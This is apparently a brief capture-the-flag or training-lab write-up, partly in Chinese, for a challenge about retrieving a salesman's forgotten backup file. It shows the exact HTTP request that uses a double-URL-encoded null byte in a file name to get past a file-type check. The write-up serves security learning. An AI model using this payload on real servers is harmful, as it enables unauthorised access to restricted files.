---
title: Forgotten Sales Backup
description: 尝试绕过文件类型的文件名空字节攻击时，也尝试使用多层 URL 编码推迟被解析为空字节的位置。
---
- 描述： Access a salesman's forgotten backup file.
- 由已探测的 ```/ftp``` 路径，使用双重 URL 编码的空字节攻击访问对应文件 ```GET /ftp/coupons_2013.md.bak%2500.md HTTP/1.1```